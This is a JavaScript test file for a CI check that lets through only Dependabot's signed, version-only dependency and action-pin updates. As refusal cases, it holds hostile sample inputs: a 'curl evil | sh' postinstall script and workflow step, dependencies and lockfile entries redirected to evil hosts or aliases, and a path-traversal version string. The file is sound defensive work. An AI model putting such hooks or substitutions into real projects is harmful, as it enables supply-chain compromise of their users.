// dependabot-exemption.test.mjs — the narrow Dependabot exception of check-commit-identity.mjs
// (owner decisions 2026-11-15 and 2026-11-19): passes only for Dependabot's own GitHub-signed
// commits on its branch that only bump existing dependency versions (root, workspaces, the standalone
// tools/lhci lock, lock-only resolution updates within the declared ranges) or action pin shas; every refusal case fails. Real git
// in throw-away repos, the GitHub API is a loopback stub (TLDCOST_GITHUB_API), no network.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import {
  DEPENDABOT,
  LOCK_VERSION,
  PACKAGE_NAME,
  PIN_LINE,
  VERSION_SPEC,
  WEB_FLOW,
  apiBase,
  STANDALONE_LOCK_DIRS,
  diffHunks,
  lockDir,
  lockOnlyFinding,
  manifestMatcher,
  packageJsonFinding,
  packageKeyMatcher,
  packageLockFinding,
  pinOnlyDiff,
  standaloneManifestDir,
} from './lib/dependabot-exemption.mjs';

const SCRIPT = resolve(import.meta.dirname, 'check-commit-identity.mjs');
const OK = 'coins4me@users.noreply.github.com';
const TOKEN = 'ghs_TESTTOKENthatmustneverbeprinted';
const BRANCH = 'dependabot/npm_and_yarn/prod-abc123';
const [SHA_A, SHA_B, SHA_C] = ['a', 'b', 'c'].map((c) => c.repeat(40));
const REG = 'https://registry.npmjs.org';

const json = (o) => JSON.stringify(o, null, 2) + '\n';
const ROOT = {
  name: 'x',
  private: true,
  workspaces: ['packages/*', 'site'],
  scripts: { build: 'tsc -b' },
  dependencies: { 'left-pad': '^1.0.0' },
  devDependencies: { vitest: '^3.0.0' },
  overrides: { glob: { minimatch: '9.0.0' } },
};
const SITE = { name: 'site', dependencies: { astro: '5.0.0' } };
const LOCK = {
  name: 'x',
  lockfileVersion: 3,
  packages: {
    '': { name: 'x', workspaces: ['packages/*', 'site'], dependencies: { 'left-pad': '^1.0.0' } },
    // an old entry: unchanged entries are not judged again (sha1 is fine while untouched)
    'node_modules/old': {
      version: '0.1.0',
      resolved: `${REG}/old/-/old-0.1.0.tgz`,
      integrity: 'sha1-AAAA',
    },
    'node_modules/left-pad': {
      version: '1.0.0',
      resolved: `${REG}/left-pad/-/left-pad-1.0.0.tgz`,
      integrity: 'sha512-AAAA',
    },
    'node_modules/site': { resolved: 'site', link: true },
    site: { name: 'site', dependencies: { astro: '5.0.0' } },
  },
};
/** Lockfile entry from the npm registry: its own tarball, a sha512 integrity (synthetic). */
const reg = (name, version, extra = {}) => ({
  version,
  resolved: `${REG}/${name}/-/${name.split('/').pop()}-${version}.tgz`,
  integrity: `sha512-${Buffer.from(`${name}@${version}`).toString('base64')}`,
  dev: true,
  ...extra,
});
// the standalone tools/lhci lock, in the shape of a transitive security update: a proxy agent
// pulls in an FTP client through get-uri; the update bumps the chain, a major included
const LHCI = { name: 'lhci', private: true, devDependencies: { '@lhci/cli': '0.16.1' } };
const LHCI_LOCK = {
  name: 'lhci',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.1' } },
    'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.1', {
      dependencies: { 'proxy-agent': '^8.0.2' },
    }),
    'node_modules/proxy-agent': reg('proxy-agent', '8.0.2', {
      dependencies: { 'get-uri': '8.0.1' },
    }),
    'node_modules/get-uri': reg('get-uri', '8.0.1', { dependencies: { 'basic-ftp': '^5.3.1' } }),
    'node_modules/basic-ftp': reg('basic-ftp', '5.3.1'),
    'node_modules/quickjs-wasi': reg('quickjs-wasi', '2.2.0'),
  },
};
const LHCI_BUMP = {
  'node_modules/proxy-agent': reg('proxy-agent', '8.0.3', { dependencies: { 'get-uri': '8.0.2' } }),
  'node_modules/get-uri': reg('get-uri', '8.0.2', { dependencies: { 'basic-ftp': '^6.2.4' } }),
  'node_modules/basic-ftp': reg('basic-ftp', '6.2.6'),
  'node_modules/quickjs-wasi': reg('quickjs-wasi', '3.7.0'),
};
const lhciLockWith = (pkgs) => json({ ...LHCI_LOCK, packages: { ...LHCI_LOCK.packages, ...pkgs } });
const WORKFLOW = `name: X
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA_A} # v1.0.0
      - uses: actions/setup-node@${SHA_A} # v2.0.0
      - run: echo hi
  reuse:
    uses: some-org/shared/.github/workflows/ci.yml@${SHA_A} # v1
`;

/** Throw-away repo with root/workspace manifests, a lockfile, a workflow and a README. */
function repo() {
  const dir = mkdtempSync(join(tmpdir(), 'chnet-depbot-'));
  const env = (a, c) => ({
    PATH: process.env.PATH,
    HOME: tmpdir(),
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_CONFIG_GLOBAL: '/dev/null',
    GIT_AUTHOR_NAME: 'a',
    GIT_AUTHOR_EMAIL: a,
    GIT_COMMITTER_NAME: 'c',
    GIT_COMMITTER_EMAIL: c,
  });
  const g = (args, a = OK, c = OK) =>
    execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', env: env(a, c) }).trim();
  const write = (path, text) => {
    mkdirSync(join(dir, path, '..'), { recursive: true });
    writeFileSync(join(dir, path), text);
  };
  g(['init', '-q', '-b', 'main']);
  write('package.json', json(ROOT));
  write('package-lock.json', json(LOCK));
  write('packages/core/package.json', json({ name: 'core', dependencies: { zod: '^3.0.0' } }));
  write('site/package.json', json(SITE));
  write('other/package.json', json({ name: 'other', dependencies: { zod: '^3.0.0' } }));
  write('tools/lhci/package.json', json(LHCI));
  write('tools/lhci/package-lock.json', json(LHCI_LOCK));
  write('tools/other/package.json', json(LHCI));
  write('tools/other/package-lock.json', json(LHCI_LOCK));
  write('.github/workflows/ci.yml', WORKFLOW);
  write('README.md', 'x\n');
  g(['add', '-A']);
  g(['commit', '-q', '-m', 'base']);
  const base = g(['rev-parse', 'HEAD']);
  /** Commit the given file contents (null: delete the file) as author a / committer c. */
  const commit = (files, a = DEPENDABOT.email, c = WEB_FLOW.email) => {
    for (const [path, text] of Object.entries(files)) {
      if (text === null) rmSync(join(dir, path));
      else write(path, text);
    }
    g(['add', '-A']);
    g(['commit', '-q', '-m', 'bump'], a, c);
  };
  return { dir, base, commit, head: () => g(['rev-parse', 'HEAD']) };
}

/** GitHub API answer for a Dependabot commit, verified (overrides per test). */
const apiCommit = (sha, over = {}) => ({
  sha,
  author: { login: DEPENDABOT.login },
  committer: { login: WEB_FLOW.login },
  commit: {
    author: { email: DEPENDABOT.email },
    committer: { email: WEB_FLOW.email },
    verification: { verified: true, reason: 'valid' },
  },
  ...over,
});

/** Loopback stub of GET /repos/{repo}/commits/{sha}; `answer(sha)` -> [status, body]. */
async function stub(answer) {
  const seen = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url, auth: req.headers.authorization });
    const [status, body] = answer(req.url.split('/').pop());
    res.writeHead(status, { 'content-type': 'application/json' });
    res.end(JSON.stringify(body));
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}`;
  return { url, seen, close: () => new Promise((r) => server.close(r)) };
}

/** Run the script (async: the stub server lives in this process). */
function run(dir, args, env = {}) {
  return new Promise((done) => {
    const p = spawn('node', [SCRIPT, ...args], {
      cwd: dir,
      env: { PATH: process.env.PATH, ...env },
    });
    let out = '';
    p.stdout.on('data', (d) => (out += d));
    p.stderr.on('data', (d) => (out += d));
    p.on('close', (code) => done({ code, out }));
  });
}

const verifiedApi = (sha) => [200, apiCommit(sha)];

/** Range check of the repo with the Dependabot context; api answers via the stub. */
async function check(
  r,
  { api = verifiedApi, branch = BRANCH, actor = DEPENDABOT.login, env } = {},
) {
  const s = await stub(api);
  try {
    const res = await run(
      r.dir,
      ['--range', `${r.base}..${r.head()}`, '--branch', branch, '--actor', actor],
      env ?? { GITHUB_REPOSITORY: 'chnet/tldcost', GITHUB_TOKEN: TOKEN, TLDCOST_GITHUB_API: s.url },
    );
    return { ...res, seen: s.seen };
  } finally {
    await s.close();
  }
}

/** One Dependabot commit with these files must be refused with a message matching `re`. */
async function refused(files, re) {
  const r = repo();
  r.commit(files);
  const res = await check(r);
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, re);
  assert.match(res.out, /author e-mail not on the CHnet allowlist/);
  assert.ok(!res.out.includes(TOKEN));
}

const rootWith = (over) => json({ ...ROOT, ...over });
const lockWith = (pkgs) => json({ ...LOCK, packages: { ...LOCK.packages, ...pkgs } });
const bumpedLeftPad = {
  'node_modules/left-pad': {
    version: '1.3.0',
    resolved: `${REG}/left-pad/-/left-pad-1.3.0.tgz`,
    integrity: 'sha512-BBBB',
  },
};
const astro = (v) => ({ 'site/package.json': json({ ...SITE, dependencies: { astro: v } }) });

test('positive: version bumps (root, workspace, override, lock) and pin sha updates pass', async () => {
  const r = repo();
  r.commit({
    'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
    'package-lock.json': lockWith({
      ...bumpedLeftPad,
      '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
    }),
  });
  r.commit(astro('5.1.2'));
  r.commit({
    'packages/core/package.json': json({ name: 'core', dependencies: { zod: '^3.1.0' } }),
    'package.json': rootWith({ overrides: { glob: { minimatch: '9.0.5' } } }),
  });
  r.commit({
    '.github/workflows/ci.yml': WORKFLOW.replace(
      `checkout@${SHA_A} # v1.0.0`,
      `checkout@${SHA_B} # v1.1.0`,
    ).replace(`ci.yml@${SHA_A} # v1`, `ci.yml@${SHA_C} # v1.2`),
  });
  const res = await check(r);
  assert.equal(res.code, 0, res.out);
  assert.match(res.out, /Dependabot exception: 4 commit\(s\)/);
  assert.equal(res.seen.length, 4);
  assert.ok(res.seen.every((x) => x.auth === `Bearer ${TOKEN}`));
  assert.ok(res.seen.every((x) => x.url.startsWith('/repos/chnet/tldcost/commits/')));
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: package.json – new dependency, script, other field, non-version spec', async () => {
  await refused(
    { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.0.0', evil: '1.0.0' } }) },
    /dependencies changed beyond the version/,
  );
  await refused(
    { 'package.json': rootWith({ scripts: { build: 'tsc -b', postinstall: 'curl evil | sh' } }) },
    /a field other than a dependency version changed/,
  );
  await refused(
    { 'package.json': rootWith({ bin: { x: 'evil.js' } }) },
    /a top-level field was added or removed/,
  );
  await refused(
    { 'package.json': rootWith({ name: 'renamed' }) },
    /a field other than a dependency version changed/,
  );
  for (const spec of [
    'github:evil/left-pad',
    'file:../evil',
    'https://evil.example/x.tgz',
    'npm:evil@1.0.0',
  ]) {
    await refused(
      { 'package.json': rootWith({ dependencies: { 'left-pad': spec } }) },
      /dependencies changed beyond the version/,
    );
  }
});

test('refused: package-lock.json resolved outside the npm registry, a moved link', async () => {
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({
        'node_modules/left-pad': { version: '1.3.0', resolved: 'https://evil.example/lp.tgz' },
      }),
    },
    /without its own registry.npmjs.org tarball and sha512 integrity/,
  );
  // right host, wrong package: evil-pkg installed as react; also: no integrity, an npm alias
  for (const entry of [
    {
      'node_modules/react': {
        version: '18.3.2',
        resolved: `${REG}/evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
    { 'node_modules/react': { version: '18.3.2', resolved: `${REG}/react/-/react-18.3.2.tgz` } },
    // path traversal through the version: string-equal to registryTarball, resolves to evil-pkg
    {
      'node_modules/react': {
        version: '1/../../../evil-pkg/-/evil-pkg-1.0.0',
        resolved: `${REG}/react/-/react-1/../../../evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
    {
      'node_modules/react': {
        name: 'evil-pkg',
        version: '1.0.0',
        resolved: `${REG}/evil-pkg/-/evil-pkg-1.0.0.tgz`,
        integrity: 'sha512-CCCC',
      },
    },
  ]) {
    await refused(
      {
        'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
        'package-lock.json': lockWith({ ...bumpedLeftPad, ...entry }),
      },
      /without its own registry.npmjs.org tarball and sha512 integrity/,
    );
  }
  // a name segment starting with '.': no package key (refused before the tarball check)
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        'node_modules/..': {
          version: '1.0.0',
          resolved: `${REG}/../-/..-1.0.0.tgz`,
          integrity: 'sha512-CCCC',
        },
      }),
    },
    /an added or changed key that is not node_modules\/<name> at the root or in a workspace/,
  );
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'package-lock.json': lockWith({ 'node_modules/site': { resolved: '../evil', link: true } }),
    },
    /a workspace link changed/,
  );
});

test('refused: workflows – repo swap, added step, removed pin, reusable swap, other line', async () => {
  const swap = (from, to) => ({ '.github/workflows/ci.yml': WORKFLOW.replace(from, to) });
  const pinned = /a workflow change other than a sha update of an existing uses: pin/;
  await refused(swap(`actions/checkout@${SHA_A}`, `evil-org/checkout@${SHA_B}`), pinned);
  await refused(
    swap('      - run: echo hi', `      - uses: other-org/action@${SHA_B}\n      - run: echo hi`),
    pinned,
  );
  await refused(
    swap(
      `checkout@${SHA_A} # v1.0.0`,
      `checkout@${SHA_B} # v1.1.0\n      - uses: other-org/action@${SHA_B}`,
    ),
    pinned,
  );
  await refused(swap(`      - uses: actions/setup-node@${SHA_A} # v2.0.0\n`, ''), pinned);
  await refused(
    swap(
      `some-org/shared/.github/workflows/ci.yml@${SHA_A}`,
      `evil-org/shared/.github/workflows/ci.yml@${SHA_B}`,
    ),
    pinned,
  );
  await refused(swap('echo hi', 'curl evil | sh'), pinned);
});

test('refused: other files, a non-workspace package.json, added files', async () => {
  await refused({ 'README.md': 'changed\n' }, /a file outside the manifests and workflow pins/);
  await refused(
    { 'other/package.json': json({ name: 'other', dependencies: { zod: '^3.1.0' } }) },
    /a file outside the manifests and workflow pins/,
  );
  await refused(
    { 'packages/new/package.json': json({ name: 'n' }) },
    /only modified files allowed \(status A\)/,
  );
});

test('refused: spoofed Dependabot e-mail without a GitHub signature', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await check(r, {
    api: (sha) => {
      const body = apiCommit(sha);
      body.commit.verification = { verified: false, reason: 'unsigned' };
      return [200, body];
    },
  });
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, /signature not verified/);
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: verified, but GitHub maps author/committer to other logins', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await check(r, {
    api: (sha) => [
      200,
      apiCommit(sha, { author: { login: 'someone' }, committer: { login: 'someone' } }),
    ],
  });
  assert.equal(res.code, 1, res.out);
  assert.match(res.out, /does not name dependabot\[bot\] as author/);
  assert.match(res.out, /does not name web-flow as committer/);
});

test('refused: wrong branch, or not opened/pushed by Dependabot (no API call)', async () => {
  for (const ctx of [
    { branch: 'feature/x' },
    { branch: 'main' },
    { actor: 'coins4me' },
    { actor: '' },
  ]) {
    const r = repo();
    r.commit(astro('5.1.2'));
    const res = await check(r, ctx);
    assert.equal(res.code, 1, JSON.stringify(ctx) + res.out);
    assert.equal(res.seen.length, 0, 'no API call outside the context');
  }
});

test('refused: mixed range (Dependabot plus a CHnet commit), mixed commit (human committer)', async () => {
  const range = repo();
  range.commit(astro('5.1.2'));
  range.commit(astro('5.1.3'), OK, OK);
  const r1 = await check(range);
  assert.equal(r1.code, 1, r1.out);
  assert.equal(r1.seen.length, 0, 'no exception, so no API call');
  const mixed = repo();
  mixed.commit(astro('5.1.2'), DEPENDABOT.email, OK);
  const r2 = await check(mixed);
  assert.equal(r2.code, 1, r2.out);
  assert.equal(r2.seen.length, 0);
});

test('refused: API errors and a missing token fail closed', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const notFound = await check(r, { api: () => [404, { message: 'Not Found' }] });
  assert.equal(notFound.code, 1, notFound.out);
  assert.match(notFound.out, /GitHub API status 404/);
  const other = await check(r, { api: () => [200, apiCommit(SHA_B)] });
  assert.equal(other.code, 1, other.out);
  assert.match(other.out, /answered another commit/);
  const noToken = await check(r, { env: { GITHUB_REPOSITORY: 'chnet/tldcost' } });
  assert.equal(noToken.code, 1, noToken.out);
  assert.match(noToken.out, /GITHUB_REPOSITORY\/GITHUB_TOKEN not set/);
});

test('without --branch/--actor (pre-push, old callers) a Dependabot commit fails as before', async () => {
  const r = repo();
  r.commit(astro('5.1.2'));
  const res = await run(r.dir, ['--range', `${r.base}..${r.head()}`]);
  assert.equal(res.code, 1, res.out);
});

test('refused: lockfile – sha1 on a new entry, a changed entry without resolved, root entry or top-level changes', async () => {
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  const re = /without its own registry.npmjs.org tarball and sha512 integrity/;
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        'node_modules/new-dep': {
          version: '1.0.0',
          resolved: `${REG}/new-dep/-/new-dep-1.0.0.tgz`,
          integrity: 'sha1-AAAA',
        },
      }),
    },
    re,
  );
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        'node_modules/left-pad': { version: '1.3.0', inBundle: true },
      }),
    },
    re,
  );
  await refused(
    {
      ...bump,
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0', evil: '1.0.0' } },
      }),
    },
    /root\/workspace entry: dependencies changed beyond the version/,
  );
  await refused(
    { ...bump, 'package-lock.json': json({ ...LOCK, lockfileVersion: 2 }) },
    /a top-level field other than packages changed/,
  );
});

test('positive: lock-only resolution updates (direct and transitive) of the root lock and tools/lhci pass', async () => {
  const r = repo();
  // root lock alone: left-pad 1.0.0 -> 1.3.0 inside the unchanged range ^1.0.0
  r.commit({ 'package-lock.json': lockWith(bumpedLeftPad) });
  // tools/lhci lock alone: the transitive chain, a major included, package.json unchanged
  r.commit({ 'tools/lhci/package-lock.json': lhciLockWith(LHCI_BUMP) });
  // tools/lhci direct bump: its package.json and its lock together
  r.commit({
    'tools/lhci/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }),
    'tools/lhci/package-lock.json': lhciLockWith({
      ...LHCI_BUMP,
      '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.2', {
        dependencies: { 'proxy-agent': '^8.0.3' },
      }),
    }),
  });
  // root lock alone: packages in workspace directories and nested node_modules
  r.commit({
    'package-lock.json': lockWith({
      ...bumpedLeftPad,
      'site/node_modules/a': reg('a', '1.0.0'),
      'packages/core/node_modules/@s/p': reg('@s/p', '2.0.0'),
      'node_modules/left-pad/node_modules/b': reg('b', '3.0.0'),
    }),
  });
  const res = await check(r);
  assert.equal(res.code, 0, res.out);
  assert.match(res.out, /Dependabot exception: 4 commit\(s\)/);
  assert.equal(res.seen.length, 4);
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: tools/lhci lock – foreign URL, wrong package, alias, sha1 or bad integrity', async () => {
  const re = /tools\/lhci\/package-lock.json: an added or changed package without its own registry/;
  for (const entry of [
    // a foreign registry URL
    { ...reg('basic-ftp', '6.2.6'), resolved: 'https://evil.example/basic-ftp-6.2.6.tgz' },
    // a mirror that is not registry.npmjs.org
    {
      ...reg('basic-ftp', '6.2.6'),
      resolved: 'https://registry.yarnpkg.com/basic-ftp/-/basic-ftp-6.2.6.tgz',
    },
    // right host, wrong package
    { ...reg('basic-ftp', '6.2.6'), resolved: `${REG}/evil-pkg/-/evil-pkg-6.2.6.tgz` },
    // an npm alias (npm:evil-pkg@1.0.0 installed under the name basic-ftp)
    { ...reg('evil-pkg', '1.0.0'), name: 'evil-pkg' },
    // sha1, a malformed sha512, no integrity
    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha1-AAAA' },
    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha512-not base64!' },
    { ...reg('basic-ftp', '6.2.6'), integrity: undefined },
  ]) {
    await refused(
      {
        'tools/lhci/package-lock.json': lhciLockWith({
          ...LHCI_BUMP,
          'node_modules/basic-ftp': entry,
        }),
      },
      re,
    );
  }
  await refused(
    {
      'tools/lhci/package.json': json({
        ...LHCI,
        devDependencies: { '@lhci/cli': 'npm:evil-pkg@1.0.0' },
      }),
    },
    /tools\/lhci\/package.json: devDependencies changed beyond the version/,
  );
  await refused(
    { 'tools/lhci/package.json': json({ ...LHCI, scripts: { postinstall: 'curl evil | sh' } }) },
    /tools\/lhci\/package.json: a top-level field was added or removed/,
  );
});

test('refused: lock-only change of a root, workspace or link entry (no package.json change)', async () => {
  const re = /changed without a package.json change, and a root, workspace or link entry changed/;
  // root lock: the root entry's spec, a workspace entry, a removed or added link
  await refused(
    {
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
      }),
    },
    re,
  );
  await refused(
    {
      'package-lock.json': lockWith({
        site: { name: 'site', dependencies: { astro: '5.1.2' } },
      }),
    },
    re,
  );
  const noLink = { ...LOCK.packages };
  delete noLink['node_modules/site'];
  await refused({ 'package-lock.json': json({ ...LOCK, packages: noLink }) }, re);
  await refused(
    {
      'package-lock.json': lockWith({
        'node_modules/core': { resolved: 'packages/core', link: true },
      }),
    },
    re,
  );
  // tools/lhci lock: its root entry's spec
  await refused(
    {
      'tools/lhci/package-lock.json': lhciLockWith({
        ...LHCI_BUMP,
        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      }),
    },
    new RegExp(`tools/lhci/package-lock.json ${re.source}`),
  );
  // a tools/lhci package.json change does not pair with the root lock
  await refused(
    {
      'tools/lhci/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }),
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
      }),
    },
    re,
  );
  // a root package.json change does not pair with the tools/lhci lock
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'tools/lhci/package-lock.json': lhciLockWith({
        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      }),
    },
    re,
  );
});

test('refused: package keys of another shape (with or without a package.json change)', async () => {
  const shape =
    /an added or changed key that is not node_modules\/<name> at the root or in a workspace/;
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  for (const key of [
    'xnode_modules/a',
    'docs/node_modules/a',
    'packages/core/x/node_modules/a',
    'node_modules/a/b',
    'node_modules/a/node_modules/',
  ]) {
    await refused({ ...bump, 'package-lock.json': lockWith({ [key]: reg('a', '1.0.0') }) }, shape);
    await refused({ 'package-lock.json': lockWith({ [key]: reg('a', '1.0.0') }) }, shape);
  }
  // a standalone lock has no workspace directories
  await refused(
    { 'tools/lhci/package-lock.json': lhciLockWith({ 'site/node_modules/a': reg('a', '1.0.0') }) },
    new RegExp(`tools/lhci/package-lock.json: ${shape.source}`),
  );
});

test('refused: an own "__proto__" key in the lock, with a package.json change', async () => {
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  const proto = JSON.parse('{"__proto__": {}}');
  await refused(
    { ...bump, 'package-lock.json': lockWith({ ...bumpedLeftPad, ...proto }) },
    /a root or workspace entry was added/,
  );
});

test('refused: lockfiles outside the list, added or deleted lockfiles', async () => {
  const outside = /a file outside the manifests and workflow pins/;
  await refused({ 'tools/other/package-lock.json': lhciLockWith(LHCI_BUMP) }, outside);
  await refused(
    { 'tools/other/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }) },
    outside,
  );
  await refused(
    { 'tools/lhci/sub/package-lock.json': lhciLockWith(LHCI_BUMP) },
    /only modified files allowed \(status A\)/,
  );
  await refused(
    { 'tools/lhci/npm-shrinkwrap.json': lhciLockWith(LHCI_BUMP) },
    /only modified files allowed \(status A\)/,
  );
  await refused(
    { 'tools/lhci/package-lock.json': null },
    /only modified files allowed \(status D\)/,
  );
  await refused({ 'package-lock.json': null }, /only modified files allowed \(status D\)/);
});

test('helpers: pin lines, pairing, diff parsing, manifests, versions, lock, API base', () => {
  assert.ok(PIN_LINE.test(`      - uses: actions/checkout@${SHA_A} # v7.0.1`));
  assert.ok(PIN_LINE.test(`    uses: org/repo/.github/workflows/x.yml@${SHA_B}`));
  assert.ok(!PIN_LINE.test('      - uses: actions/checkout@v7'));
  assert.ok(!PIN_LINE.test(`      - uses: actions/checkout@${SHA_A}; echo x`));
  // pairing: same line up to sha and comment
  const hunk = (rem, add) =>
    `diff --git a/f b/f\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-${rem}\n+${add}\n`;
  const pin = (repoName, sha, c = '') => `      - uses: ${repoName}@${sha}${c}`;
  assert.ok(pinOnlyDiff(hunk(pin('a/b', SHA_A, ' # v1'), pin('a/b', SHA_B, ' # v2'))));
  assert.ok(!pinOnlyDiff(hunk(pin('a/b', SHA_A), pin('a/c', SHA_B))));
  assert.ok(!pinOnlyDiff(hunk(pin('a/b', SHA_A), `  ${pin('a/b', SHA_B)}`)));
  assert.ok(!pinOnlyDiff(`@@ -1,0 +2 @@\n+${pin('a/b', SHA_B)}\n`));
  assert.ok(!pinOnlyDiff(''));
  // a content line that starts with "++"/"--" is content, not a header; "\ No newline" is skipped
  assert.deepEqual(
    diffHunks('--- a/f\n+++ b/f\n@@ -1 +1 @@\n-++ x\n+-- y\n\\ No newline at end of file\n'),
    [{ removed: ['++ x'], added: ['-- y'] }],
  );
  const m = manifestMatcher(['packages/*', 'site']);
  for (const p of ['package.json', 'packages/core/package.json', 'site/package.json']) {
    assert.ok(m(p), p);
  }
  for (const p of [
    'package-lock.json',
    'packages/core/src/x.ts',
    'packages/a/b/package.json',
    'other/package.json',
  ]) {
    assert.ok(!m(p), p);
  }
  for (const v of ['1.2.3', '^1.2.3', '~1.2', '>=1.2.3', '1.2.3-rc.1', '5']) {
    assert.ok(VERSION_SPEC.test(v), v);
  }
  for (const v of ['latest', '*', 'github:a/b', 'file:x', 'npm:a@1', '1.2.3 || evil']) {
    assert.ok(!VERSION_SPEC.test(v), v);
  }
  for (const v of ['1.2.3', '1.2.3-rc.1', '1.2.3+build.5']) assert.ok(LOCK_VERSION.test(v), v);
  for (const v of ['1/../x', '1.2', '1.2.3-', '1.2.3-a..b', '1.2.3/x']) {
    assert.ok(!LOCK_VERSION.test(v), v);
  }
  for (const n of ['react', '@types/node', 'lodash.merge', 'a-b~c'])
    assert.ok(PACKAGE_NAME.test(n), n);
  for (const n of ['..', '.hidden', '_x', '@s/..', '@./x', 'A', 'a/b']) {
    assert.ok(!PACKAGE_NAME.test(n), n);
  }
  assert.equal(
    packageJsonFinding('{"dependencies":{"a":"1.0.0"}}', '{"dependencies":{"a":"1.0.1"}}'),
    '',
  );
  assert.match(packageJsonFinding('not json', '{}'), /not valid JSON/);
  assert.equal(packageLockFinding(json(LOCK), lockWith(bumpedLeftPad)), '');
  // scoped and nested entries
  const scoped = {
    'node_modules/@types/node': {
      version: '22.1.0',
      resolved: `${REG}/@types/node/-/node-22.1.0.tgz`,
      integrity: 'sha512-DDDD',
    },
    'node_modules/a/node_modules/left-pad': {
      version: '1.1.0',
      resolved: `${REG}/left-pad/-/left-pad-1.1.0.tgz`,
      integrity: 'sha512-EEEE',
    },
  };
  assert.equal(packageLockFinding(json(LOCK), lockWith(scoped)), '');
  assert.match(
    packageLockFinding(
      json(LOCK),
      lockWith({
        'node_modules/@types/node': {
          version: '22.1.0',
          resolved: `${REG}/@evil/node/-/node-22.1.0.tgz`,
          integrity: 'sha512-DDDD',
        },
      }),
    ),
    /own registry.npmjs.org tarball/,
  );
  for (const bad of [
    'https://evil.example',
    'http://localhost:1234',
    'http://127.0.0.1.evil.example:80',
    'http://127.0.0.1:1234/x',
    'http://127.0.0.1',
  ]) {
    assert.equal(apiBase({ TLDCOST_GITHUB_API: bad }), 'https://api.github.com', bad);
  }
  assert.equal(apiBase({ TLDCOST_GITHUB_API: 'http://127.0.0.1:1234' }), 'http://127.0.0.1:1234');
  assert.equal(apiBase({}), 'https://api.github.com');
  // standalone locks: exactly the listed paths
  assert.deepEqual(STANDALONE_LOCK_DIRS, ['tools/lhci']);
  assert.equal(lockDir('package-lock.json'), '');
  assert.equal(lockDir('tools/lhci/package-lock.json'), 'tools/lhci');
  for (const p of [
    'tools/other/package-lock.json',
    'tools/lhci/sub/package-lock.json',
    'x/tools/lhci/package-lock.json',
    'tools/lhci/package-lock.json.bak',
    'site/package-lock.json',
  ]) {
    assert.equal(lockDir(p), null, p);
  }
  assert.equal(standaloneManifestDir('tools/lhci/package.json'), 'tools/lhci');
  assert.equal(standaloneManifestDir('tools/other/package.json'), null);
  assert.equal(standaloneManifestDir('package.json'), null);
  // lock-only: only node_modules entries (no links) may change
  assert.equal(lockOnlyFinding(json(LHCI_LOCK), lhciLockWith(LHCI_BUMP)), '');
  assert.equal(lockOnlyFinding(json(LOCK), lockWith(bumpedLeftPad)), '');
  assert.match(
    lockOnlyFinding(json(LOCK), lockWith({ '': { ...LOCK.packages[''], private: true } })),
    /root, workspace or link entry changed/,
  );
  assert.match(lockOnlyFinding('not json', '{}'), /not valid JSON/);
  // a non-package key counts as direct: it must stay byte-identical
  assert.match(
    lockOnlyFinding(json(LOCK), lockWith({ 'docs/node_modules/a': reg('a', '1.0.0') })),
    /root, workspace or link entry changed/,
  );
  // package keys: root or a workspace directory, names per segment
